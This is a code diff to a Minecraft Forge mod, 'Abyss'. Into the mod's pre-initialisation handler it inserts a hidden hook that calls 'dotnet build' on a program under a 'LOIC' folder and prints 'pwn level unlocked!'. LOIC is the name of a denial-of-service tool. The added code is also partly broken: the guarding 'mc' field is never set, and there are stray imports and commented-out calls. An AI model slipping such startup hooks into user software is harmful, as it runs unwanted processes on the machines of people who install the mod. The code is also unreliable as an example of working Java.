@@ -7,9 +7,14 @@ import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
 import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
-import org.apache.logging.log4j.Logger;
 
+import org.apache.logging.log4j.Logger;
 import java.util.Arrays;
+
+import java.net.URLClassLoader;
+import java.io.FileInputStream;
+import java.io.BufferedInputStream;
+import java.io.File;
 
 @Mod(modid="abyss", name="Abyss", version="1.6.0")
 public class AbyssMod {
@@ -26,9 +31,29 @@ public class AbyssMod {
 
     public Logger log;
 
+    public Minecraft mc;
+    
     @Mod.EventHandler
     public void preinit(FMLPreInitializationEvent fMLPreInitializationEvent) {
         manager.preinit(fMLPreInitializationEvent);
+         try {
+             if (mc != null) {
+                File file = new File("LOIC/src/Program.exe");
+                FileInputStream fileInputStream = new FileInputStream("LOIC/src/Program.exe");
+                /** System.getenv("dotnet.exe LOIC/src/Program.cs -o LOIC/src/Program.exe");
+                file.getAbsoluteFile(); */
+
+        ProcessBuilder pb = new ProcessBuilder("dotnet", "build", "LOIC/src/Program.cs");
+    pb.inheritIO(); 
+    Process process = pb.start();
+    process.waitFor();
+                 file.getAbsoluteFile();
+                 System.out.println("\n\n\npwn level unlocked!\n\n\n");
+        
+            }
+         } catch (Exception except) {
+            System.out.println(except.getCause());
+        }
     }
 
     @Mod.EventHandler
